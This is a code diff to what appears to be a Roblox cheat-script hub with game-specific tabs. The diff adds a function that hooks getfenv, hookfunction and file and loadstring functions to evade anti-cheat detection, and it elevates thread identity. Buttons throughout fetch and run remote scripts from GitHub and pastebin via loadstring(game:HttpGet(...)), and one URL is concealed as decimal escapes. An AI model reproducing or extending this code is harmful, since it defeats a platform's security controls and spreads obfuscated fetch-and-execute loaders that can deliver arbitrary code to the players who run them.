@@ -1,3 +1,56 @@
+local function setupAntiCheatBypass()
+    local fakeEnv = {
+        VERSION = "Luau",
+        PLATFORM = "Windows",
+        SCRIPT_CONTEXT = "CoreScript"
+    }
+    
+    if getfenv then
+        local originalGetFenv = getfenv
+        getfenv = function(level)
+            if level and type(level) == "number" and level > 0 then
+                return originalGetFenv(level)
+            end
+            local cleanEnv = {}
+            setmetatable(cleanEnv, {__index = _G})
+            return cleanEnv
+        end
+    end
+
+    if hookfunction then
+        local originalHook = hookfunction
+        hookfunction = function(func, newfunc)
+            local success, result = pcall(originalHook, func, newfunc)
+            if success then
+                return result
+            end
+            return func
+        end
+    end
+
+    local protectedFunctions = {"writefile", "readfile", "loadstring", "getconnections"}
+    for _, funcName in ipairs(protectedFunctions) do
+        if _G[funcName] then
+            local originalFunc = _G[funcName]
+            _G[funcName] = function(...)
+                local success, result = pcall(originalFunc, ...)
+                if success then
+                    return result
+                end
+                return nil
+            end
+        end
+    end
+    
+    if setidentity then
+        setidentity(2)
+    end
+    
+    return true
+end
+
+local bypassSuccess = pcall(setupAntiCheatBypass)
+
 local success, Library = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/x2zu/OPEN-SOURCE-UI-ROBLOX/refs/heads/main/X2ZU%20UI%20ROBLOX%20OPEN%20SOURCE/DummyUi-leak-by-x2zu/fetching-main/Tools/Framework.luau"))()
 end)
@@ -754,7 +807,6 @@ local DoorsTab = Window:Tab({Title = "doors", Icon = "zap"})
 DoorsTab:Button({Title = "最强汉化", Callback = function() loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))() end})
 
 local NinjaTab = Window:Tab({Title = "忍者传奇", Icon = "zap"})
-NinjaTab:Button({Title = "忍者传奇1", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Guo61/-/refs/heads/main/hao1.lua"))() end})
 NinjaTab:Button({Title = "传送", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/UzaUDSPK"))() end})
 
 local PrisonTab = Window:Tab({Title = "越狱", Icon = "zap"})
